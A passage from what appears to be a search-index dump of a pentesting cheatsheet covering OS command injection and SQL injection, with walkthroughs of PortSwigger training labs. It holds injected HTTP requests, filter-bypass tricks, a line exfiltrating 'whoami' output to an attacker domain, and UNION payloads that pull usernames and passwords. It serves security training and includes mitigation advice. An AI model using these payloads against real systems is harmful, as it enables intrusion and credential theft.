empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nproductId=1&amp;storeId=1\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 3\n\n62\n</code></pre> <p>Testing each parameter individually, we get an error in the productId field:</p> <p></p> <p>The same payload works in the storeId field, however. </p> <p></p> <p>The following script is what's getting executed</p> <pre><code>#!/bin/bash\n\nset -eu\n\neval cksum &lt;&lt;&lt; \"$1 $2\" | cut -c 2-3 | rev | sed s/0/1/\n</code></pre> <p>The input we provide is being expanded in <code>$2</code> and is passed to <code>eval</code>. </p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#useful-commands","title":"Useful Commands","text":"<p>These can be useful for getting more information about the operating system and environment.</p> LinuxWindows <p>Name of the current user</p> <pre><code>whoami\n</code></pre> <p>Operating system</p> <pre><code>uname -a\n</code></pre> <p>Network configuration</p> <pre><code>ifconfig\nip address show\n</code></pre> <p>Network connections</p> <pre><code>netstat -ano\n</code></pre> <p>Running processes</p> <pre><code>ps -ef\n</code></pre> <p>Name of the current user</p> <pre><code>whoami\n</code></pre> <p>Operating system</p> <pre><code>ver\n</code></pre> <p>Network configuration</p> <pre><code>ipconfig /all\n</code></pre> <p>Network connections</p> <pre><code>netstat -ano\n</code></pre> <p>Running processes</p> <pre><code>tasklist\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#blind-os-command-injection","title":"Blind OS Command Injection","text":"<p>If the application does not return the results of the command to the user, it's blind OS command injection vulnerability. </p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#detecting-blind-os-command-injection","title":"Detecting blind OS command injection","text":""},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#time-delay","title":"Time delay","text":"<p>Example:</p> <pre><code>&amp; ping -c 10 127.0.0.1 &amp;\n</code></pre> <p>This will generate a 10 second time delay. </p> PortSwigger OS Command Injection Lab 2: Blind OS command injection with time delays <p>The application has a user feedback submission form.</p> <p></p> <p>After submitting feedback we just get a simple confirmation message</p> <p></p> <p>The submission POST request and response are below:</p> <pre><code>POST /feedback/submit HTTP/1.1\nHost: 0ac6008a0376a6c98350af40005d0069.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nOrigin: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net\nConnection: keep-alive\nReferer: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net/feedback\nCookie: session=8mtcQ6OZfUVHqePZkLJJFthKWrV0R6QQ\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\ncsrf=tOw3LbawuI4HrrZRySXz0mv0uLBlRa4X&amp;name=tester&amp;email=tester%40test.com&amp;subject=Testing&amp;message=Test+message\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 2\n\n{}\n</code></pre> <p>When we add a time delay payload in the email field, we get a (roughly) 10 second delay.</p> <pre><code>POST /feedback/submit HTTP/1.1\nHost: 0ac6008a0376a6c98350af40005d0069.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nOrigin: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net\nConnection: keep-alive\nReferer: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net/feedback\nCookie: session=8mtcQ6OZfUVHqePZkLJJFthKWrV0R6QQ\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\ncsrf=tOw3LbawuI4HrrZRySXz0mv0uLBlRa4X&amp;name=tester&amp;email=tester%40test.com%26ping%20-c%2010%20127.0.0.1%20%26&amp;subject=Testing&amp;message=Test+message%26ping%20-c%2010%20127.0.0.1%20%26\n</code></pre> <pre><code>HTTP/1.1 500 Internal Server Error\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 16\n\n\"Could not save\"\n</code></pre> <p></p> <p>And the lab is done. </p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#redirecting-output","title":"Redirecting output","text":"<p>If you know the web root, try redirecting the output of a command to a file in the web root that you can access in the browser.</p> <p>The example given on PortSwigger is </p> <pre><code>&amp; whoami &gt; /var/www/static/whoami.txt &amp;\n</code></pre> PortSwigger OS Command Injection Lab 3: Blind OS command injection with output redirection <p>This lab has a writable folder at <code>/var/www/images/</code>.</p> <p>The following request shows submitting user feedback.</p> <pre><code>POST /feedback/submit HTTP/1.1\nHost: 0a9b0076038b818e80098ad000df00bf.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net\nConnection: keep-alive\nReferer: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net/feedback\nCookie: session=WJSRirprxjalGTY0Rt4cRJjhcI1Yeeaf\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\ncsrf=SNExcmSFEI5HlhrXBK2GsamVMqSLoxbC&amp;name=Tester&amp;email=tester%40test.com&amp;subject=Test&amp;message=Test+message\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 2\n\n{}\n</code></pre> <p>Sending a modified request as shown below results in an error:</p> <pre><code>POST /feedback/submit HTTP/1.1\nHost: 0a9b0076038b818e80098ad000df00bf.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net\nConnection: keep-alive\nReferer: https://0a9b0076038b818e80098ad000df00bf.web-security-academy.net/feedback\nCookie: session=WJSRirprxjalGTY0Rt4cRJjhcI1Yeeaf\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\ncsrf=SNExcmSFEI5HlhrXBK2GsamVMqSLoxbC&amp;name=Tester&amp;email=tester%40test.com%26%20whoami%20%3E%20%2Fvar%2Fwww%2Fimages%2Foutput.txt%26&amp;subject=Test&amp;message=Test+message\n</code></pre> <pre><code>HTTP/1.1 500 Internal Server Error\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 16\n\n\"Could not save\"\n</code></pre> <p>Despite the error, it is still possible to access the file to solve the lab.</p> <pre><code>GET /image?filename=output.txt HTTP/1.1\nHost: 0a9b0076038b818e80098ad000df00bf.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nCookie: session=WJSRirprxjalGTY0Rt4cRJjhcI1Yeeaf\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 13\n\npeter-5bn1PO\n</code></pre> <p>Done!</p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#out-of-band-techniques","title":"Out-of-band techniques","text":""},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#dns-lookup","title":"DNS lookup","text":"<p>In some cases, we might be able to trigger a network (DNS) lookup and/or outbound HTTP requests to an attacker-controlled server using something like</p> <pre><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;\n</code></pre> PortSwigger OS Command Injection Lab 4: Blind OS command injection with out-of-band interaction <p>This lab also has a user feedback submission form.</p> <pre><code>POST /feedback/submit HTTP/1.1\nHost: 0a39006204d02b9e8091e49a0097000a.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nOrigin: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net\nConnection: keep-alive\nReferer: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net/feedback\nCookie: session=1McxLb2lWaNaBFGd9uyodxWSUupAnm83\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\ncsrf=xNsEm8VcnAybNoHTgWTJY7MqFygRJRi8&amp;name=Tester&amp;email=tester%40test.com&amp;subject=Testing&amp;message=test+message\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 2\n\n{}\n</code></pre> <p>I'm sending the following payload in the email field</p> <pre><code>&amp;nslookup https://gbm3awvusa4mhpmkcwqf4pe2rpnsbaz3v.oast.site&amp;\n</code></pre> <p>Sending the following request results in a hit to collaborator:</p> <pre><code>POST /feedback/submit HTTP/2\nHost: 0a39006204d02b9e8091e49a0097000a.web-security-academy.net\nCookie: session=1McxLb2lWaNaBFGd9uyodxWSUupAnm83\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 166\nOrigin: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net\nReferer: https://0a39006204d02b9e8091e49a0097000a.web-security-academy.net/feedback\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-Pwnfox-Color: magenta\nPriority: u=0\nTe: trailers\n\ncsrf=xNsEm8VcnAybNoHTgWTJY7MqFygRJRi8&amp;name=Tester&amp;email=tester%40test.com%26nslookup+3pttdo9rho8ap0mjzkx76iv8yz4qsgg5.oastify.com%26&amp;subject=Test&amp;message=test+message\n</code></pre> <pre><code>HTTP/2 200 OK\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nContent-Length: 2\n\n{}\n</code></pre> <p></p> <p>And that solves the lab</p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#exfiltrate-data","title":"Exfiltrate data","text":"<p>It may be possible to extract data with out-of-band interaction. An example is below:</p> <pre><code>&amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;\n</code></pre> PortSwigger OS Command Injection Lab 5: Blind OS command injection with out-of-band data exfiltration <p>This lab has a user feedback submission form. </p> <pre><code>POST /feedback/submit HTTP/2\nHost: 0ab200d703b4c1df84bfd1a200c0009d.web-security-academy.net\nCookie: session=ipo87j6SKo7fXskaWXQme9mDas4wz3wF\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0ab200d703b4c1df84bfd1a200c0009d.web-security-academy.net\nReferer: https://0ab200d703b4c1df84bfd1a200c0009d.web-security-academy.net/feedback\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-Pwnfox-Color: magenta\nPriority: u=0\nTe: trailers\n\ncsrf=fUs7WBQ50Gax7PgQXx4dVbDcyQiBbsBA&amp;name=Tester&amp;email=tester%40test.com&amp;subject=Test&amp;message=Test+message\n</code></pre> <pre><code>HTTP/2 200 OK\nContent-Type: application/json; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nContent-Length: 2\n\n{}\n</code></pre> <p>I'm sending the following payload in the email field:</p> <pre><code>&amp;nslookup `whoami`.r0shockfscjy0ox7a88vh66w9nfe35ru.oastify.com&amp;\n</code></pre> <p></p> <p>After sending this request, we get a connection to collaborator showing the username as a subdomain:</p> <p></p> <p>After submitting that value to the lab we get the completion banner.</p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#injection-methods","title":"Injection Methods","text":"<p>Some shell characters function as command separators, including:</p> <pre><code>&amp;\n&amp;&amp;\n|\n||\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#injection-operators","title":"Injection operators","text":"Operator Character URL-encoded character Executed Command Semicolon <code>;</code> <code>%3b</code> Both New Line <code>\\n</code> <code>%0a</code> Both Background <code>&amp;</code> <code>%26</code> Both (Second likely shown first) Pipe | <code>%7c</code> Both (Only second is shown) AND <code>&amp;&amp;</code> <code>%26%26</code> Both (only if the first succeeds) OR || <code>%7c%7c</code> Second only (only if first fails) <p>The following work on *nix only</p> <pre><code>;\n0x0a\n\\n\n</code></pre> <p>On Unix-based systems we can also use <code>$()</code> and backticks '``' to execute inline commands.</p>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#filtered-character-bypass","title":"Filtered character bypass","text":"LinuxWindows <p>Get all environment variables</p> <pre><code>printenv\n</code></pre> <p>Spaces are filtered Use tabs instead of spaces</p> <pre><code>%09\n</code></pre> <p>Replace this for spaces/tabs</p> <pre><code>${IFS}\n</code></pre> <p>Bracket expansion - the comma will be replaced with a space</p> <pre><code>{ls,-la}\n</code></pre> <p>Other characters are filtered This will be replaced with '/'</p> <pre><code>${PATH:0:1}\n</code></pre> <p>Will be replaced with ';'</p> <pre><code>${LS_COLORS:10:1}\n</code></pre> <p>Shift characters by one</p> <pre><code>$(tr '!-}' '\"-~'&lt;&lt;&lt;[)\n</code></pre> <p>Get all environment variables</p> <pre><code>Get-ChildItem Env:\n</code></pre> <p>Spaces are filtered</p> <p>Use tabs instead of spaces</p> <pre><code>%09\n</code></pre> <p>Will be replaced by a space</p> <pre><code># cmd\n%PROGRAMFILES:~10,-5%\n\n# powershell\n$env:PROGRAMFILES[10]\n</code></pre> <p>Other characters are filtered</p> <p>Will be replaced with '\\'</p> <pre><code># cmd\n%HOMEPATH:~0,-17%\n\n# powershell\n$env:HOMEPATH[0]\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#blacklisted-command-bypass","title":"Blacklisted command bypass","text":"LinuxWindows <p>Character insertion</p> <p>Total of '`' and/or '\"' must be even</p> <pre><code>' or \"\n</code></pre> <p>Linux only</p> <pre><code>$@ or \\\n</code></pre> <p>Case Manipulation</p> <pre><code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")\n</code></pre> <p>Execute reversed commands</p> <pre><code>$(rev&lt;&lt;&lt;'imaohw')\n</code></pre> <p>Encoded Commands</p> <p>Encode a string with base64</p> <pre><code>echo -n 'cat /etc/passwd | grep 33' | base64\n</code></pre> <p>Execute reversed command</p> <pre><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;\n</code></pre> <p>Character insertion</p> <p>Windows only</p> <pre><code>^\n</code></pre> <p>Case Manipulation</p> <p>Just send weird casing</p> <pre><code>WhoAmi\n</code></pre> <p>Reversed Commands</p> <pre><code>\"whoami\"[-1..-20] -join ''\n</code></pre> <p>Execute reversed commands</p> <pre><code>iex \"$('imaohw'[-1..-20] -join '')\"\n</code></pre> <p>Encoded Commands</p> <p>Base64 encode a command</p> <pre><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\n</code></pre> <p>Execute the encoded command</p> <pre><code>iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"\n</code></pre>"},{"location":"references/cheatsheets/injection-attacks/OS-command-injection/index.html#preventing-os-command-injection","title":"Preventing OS Command Injection","text":"<p>Several measures can be taken to mitigate the risk of OS Command Injection, including:</p> <ul> <li>Do not call out directly to OS commands from application-level code. Use safer platform APIs. </li> <li>Apply strong input validation if the application needs to accept user input<ul> <li>Use whitelists</li> <li>Validate input on the server side, not just on the client side.</li> <li>Don't rely on simply escaping shell metacharacters.</li> </ul> </li> <li> <p>Use the web server's built-in Web Application Firewall (e.g., in Apache   <code>mod_security</code>), in addition to an external WAF (e.g.   <code>Cloudflare</code>,   <code>Fortinet</code>, <code>Imperva</code>..)</p> </li> <li> <p>Abide by the  Principle of Least Privilege (PoLP)   by running the web server as a low privileged user (e.g.    <code>www-data</code>)</p> </li> <li> <p>Prevent certain functions from being executed by the web server (e.g., in PHP <code>disable_functions=system,...</code>)</p> </li> <li> <p>Limit the scope accessible by the web application to its folder (e.g. in PHP  <code>open_basedir = '/var/www/html'</code>)</p> </li> <li> <p>Reject double-encoded requests and non-ASCII characters in URLs</p> </li> <li> <p>Avoid the use of sensitive/outdated libraries and modules (e.g.   PHP CGI)</p> </li> </ul>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html","title":"SQL Injection","text":""},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#overview","title":"Overview","text":"<p>SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It occurs when user-supplied data is insecurely included in a database query.</p> <ul> <li> <p>Core Vulnerability: Mixing user data with database query code.</p> </li> <li> <p>Classic Example: Bypassing a login form.</p> <ul> <li> <p>Input: <code>admin' OR '1'='1' --</code></p> </li> <li> <p>Resulting Query: <code>SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...';</code></p> </li> <li> <p>Effect: The <code>WHERE</code> clause becomes true for all users, and the password check is ignored (<code>--</code> is a comment), allowing a login bypass.</p> </li> </ul> </li> </ul>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#detection-methods","title":"Detection Methods","text":"<p>Methods for discovering SQLi vulnerabilities from the outside.</p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#error-based-sqli","title":"Error-Based SQLi","text":"<ul> <li> <p>Concept: Provoking the database to return an error message by injecting special characters (<code>'</code>, <code>\"</code>, <code>--</code>).</p> </li> <li> <p>Indicator: The application returns a verbose database error (e.g., <code>\"You have an error in your SQL syntax...\"</code>). This confirms the vulnerability and often reveals the database type.</p> </li> </ul>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#blind-sqli","title":"Blind SQLi","text":"<p>Used when no errors are returned. The attacker infers information based on the application's behavior.</p> <ul> <li> <p>Boolean-Based Blind SQLi:</p> <ul> <li> <p>Concept: Asking the database a series of True/False questions and observing a change in the page content.</p> </li> <li> <p>Example:</p> <ul> <li> <p><code>... AND '1'='1'</code> \u2192 Page loads normally (True).</p> </li> <li> <p><code>... AND '1'='2'</code> \u2192 Page returns \"not found\" or changes (False).</p> </li> </ul> </li> <li> <p>Result: The difference in response acts as a \"yes/no\" signal.</p> </li> </ul> </li> <li> <p>Time-Based Blind SQLi:</p> <ul> <li> <p>Concept: Forcing the database to \"sleep\" or \"wait\" for a specified time if a condition is true.</p> </li> <li> <p>Example: <code>... AND IF(1=1, SLEEP(5), 0)</code></p> </li> <li> <p>Result: If the page takes 5 seconds longer to load, the condition is true. This is a last resort as it is very slow and noisy.</p> </li> </ul> </li> </ul> <p>SQL Injection points</p> <p>Most SQL injection exists in the <code>WHERE</code> clause of the <code>SELECT</code> statement; however...</p> <p>Some other common locations where SQL injection arises are:</p> <ul> <li>In\u00a0<code>UPDATE</code>\u00a0statements, within the updated values or the\u00a0<code>WHERE</code>\u00a0clause.</li> <li>In\u00a0<code>INSERT</code>\u00a0statements, within the inserted values.</li> <li>In\u00a0<code>SELECT</code>\u00a0statements, within the table or column name.</li> <li>In\u00a0<code>SELECT</code>\u00a0statements, within the\u00a0<code>ORDER BY</code>\u00a0clause.</li> </ul> <p>Caution using <code>OR 1=1</code></p> <p>Take care when injecting the condition\u00a0<code>OR 1=1</code>\u00a0into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an\u00a0<code>UPDATE</code>\u00a0or\u00a0<code>DELETE</code> statement, for example, it can result in an accidental loss of data.</p> PortSwigger SQL Injection Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data <p>Instructions</p> <p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p> <p>Exploit</p> <p>On this shopping site, we can filter by category. For example, when \"accessories\" is selected, only three items are shown. </p> <p></p> <p>The following request and response show this:</p> <pre><code>GET /filter?category=Accessories HTTP/1.1\nHost: 0a8000b80463b54380fff8a8001500cc.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a8000b80463b54380fff8a8001500cc.web-security-academy.net/filter?category=Tech+gifts\nCookie: session=xcf9s6nU2m49EDeOXGJhsUF1dYJzO1uK\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n</code></pre> <pre><code>HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 4789\n\n[...SNIP...]\n</code></pre> <p>Note the content length of 4789. When a single quote character is added, the server complains. </p> <p></p> <p>Notice that if we add a second single quote, the applications calms down again and doesn't return an internal error. To view unreleased items, I used the following string:</p> <pre><code>' AND 1=1-- -\n</code></pre> <p>This shows the awesome and unreleased six-pack beer belt, which is a fantastic idea...btw!</p> <p></p> <p>Note that the official solution uses <code>OR 1=1-- -</code>, but this seemed to have worked for me. </p> PortSwigger SQL Injection Lab 2: SQL injection vulnerability allowing login bypass <p>Instructions</p> <p>This lab contains a SQL injection vulnerability in the login function.</p> <p>To solve the lab, perform a SQL injection attack that logs in to the application as the\u00a0<code>administrator</code>\u00a0user.</p> <p>Trying to log in as the administrator with a random password predictably fails.</p> <p></p> <p>Closing out the quotes and adding a comment before the password parameter allows us to bypass the authentication mechanism and we can log in as the administrator to solve the lab. </p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#exploitation-techniques","title":"Exploitation Techniques","text":"<p>Abusing the vulnerability</p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#union-based-sqli","title":"<code>UNION</code>-Based SQLi","text":"<p>Concept: The <code>UNION</code> operator combines the results of the application's legitimate query with the results of a malicious query crafted by the attacker.</p> <p>Process:</p> <ol> <li> <p>Find Column Count: Determine the number of columns in the original query using <code>ORDER BY n--</code> or <code>UNION SELECT NULL,NULL,...--</code>.</p> <p>Null</p> <p>Using \"NULL\" is a good idea because it is convertible to every common data type, so we can use it to figure out columns without having to fight with the database about data types. In some cases, this may cause an error like a NullPointerException, which could make this method ineffective. </p> </li> <li> <p>Extract Data: Craft a <code>UNION SELECT</code> statement to pull data from other tables.</p> </li> </ol> <p>Example Payload: <code>' UNION SELECT username, password FROM users--</code></p> <p>For a\u00a0<code>UNION</code>\u00a0query to work, two key requirements must be met:</p> <ul> <li>The individual queries must return the same number of columns.<ul> <li>Figure out how many columns there are.</li> </ul> </li> <li>The data types in each column must be compatible between the individual queries.<ul> <li>Which columns returned from the original query are of a suitable data type to host the payload?</li> </ul> </li> </ul> PortSwigger SQLi Lab 3: SQL injection UNION attack, determining the number of columns returned by the query <p>Instructions</p> <p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.</p> <p>To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.</p> <p>The lab looks like this...with filtering options. </p> <p></p> <p>Each row has a \"View details\" button which brings up the article, as shown below.</p> <p></p> <p>Adding a single quote in the category field causes an internal server error, and adding a second fixes the error, so that seems like a good place to start. </p> <pre><code>' UNION SELECT null-- -\n</code></pre> <p>After a little bit of poking, we find that the table has 3 columns. The following payload worked to solve the lab:</p> <pre><code>' UNION SELECT null,null,null-- - \n</code></pre> <p></p> <p>Tip for Oracle databases</p> <p>With Oracle databases, every SELECT statement must use a FROM clause and specify the database. We can use the built-in <code>dual</code> database for this. The query would look like this:</p> <pre><code>' UNION SELECT NULL FROM DUAL--\n</code></pre> PortSwigger SQL Injection Lab 4: SQL injection UNION attack, finding a column containing text <p>This lab is very similar to the previous one, but instead of just needing to determine the right number of columns in a table, now we need to figure out which one of those columns contains text. </p> <p>The start of the lab is the same. After a little bit of testing, we figure out there are three columns, as shown below:</p> <p></p> <pre><code>' UNION SELECT null,null,null-- -\n</code></pre> <p>Now we just need to test each of those columns with the data type we're looking for. Since we're trying to find the one that contains text, I just used <code>'a'</code> and looked for what DIDN'T cause an error. </p> <p>Here, we can see that the second column works. </p> <pre><code>Gifts' UNION SELECT null,'a',null-- -\n</code></pre> <p></p> <p>Now we just need to replace the <code>'a'</code> with whatever string the lab wants to print. In this case, it was <code>CtqSX7</code>. So I just dropped that in place of the <code>'a'</code> and solved the lab. </p> PortSwigger Lab 5: SQL injection UNION attack, retrieving data from other tables <p>Instructions</p> <p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</p> <p>The database contains a different table called\u00a0<code>users</code>, with columns called\u00a0<code>username</code>\u00a0and\u00a0<code>password</code>.</p> <p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the\u00a0<code>administrator</code>\u00a0user.</p> <p>Exploit</p> <p>Given the hint the lab provides, we can start with this payload:</p> <pre><code>' UNION SELECT username,password from users-- -\n</code></pre> <p></p> <p>That works, now we can just log in as the administrator to solve the lab.</p> <p></p> <p>It's also possible to extract multiple values in a single column with string concatenation. See the PortSwigger SQL Injection Cheatsheet</p> PortSwigger SQL Injection Lab 6: SQL injection UNION attack, retrieving multiple values in a single column <p>Lab instructions</p> <p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p> <p>The database contains a different table called\u00a0<code>users</code>, with columns called\u00a0<code>username</code>\u00a0and\u00a0<code>password</code>.</p> <p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the\u00a0<code>administrator</code>\u00a0user.</p> <p>We can start this one the same way as the other labs; first, figure out how many columns there are (2), and then figure out which column supports text. I'm using the second column. To figure out what database is in use, I used the <code>version()</code> command, and found that the DB was Postgres, as shown below.</p> <p></p> <p>According to the PortSwigger SQLi cheatsheet, the string concatenation operator in Postgres is <code>||</code>. </p> <p>So since we know (they gave us the hint) that there is a table named <code>users</code> containing columns <code>username</code> and <code>password</code>, we can extract those with something like <code>username||'~'||password</code>.</p> <p>That worked, and we got the administrator password. </p> <p></p> <p>Now we can just log in as the administrator to solve the lab.</p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#identifying-the-database","title":"Identifying the Database","text":"<p>It's probably pretty helpful to know what kind of database you're hacking on, so we'll probably need to figure that out.</p> Database type Query Microsoft, MySQL <code>SELECT @@version</code> Oracle <code>SELECT * FROM v$version</code> PostgreSQL <code>SELECT version()</code> PortSwigger SQL Injection Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft <p>Lab Instructions</p> <p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p> <p>To solve the lab, display the database version string.</p> <p>This is the same style of app...basically a eCommerce site. The required string is shown at the top of the page:</p> <p></p> <p>Start the same way... number of columns &gt; which one supports the correct data type &gt; submit payload &gt; profit. </p> <p></p> <p>After we send the <code>@@version</code> string in the second column, we force the DB to print the correct string (its version information) and we solve the lab. </p> <p></p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#information-schema","title":"Information Schema","text":"<p>It's possible to extract information about the database from the Information Schema in most databases (except Oracle).</p> PortSwigger SQL Injection Lab 8: 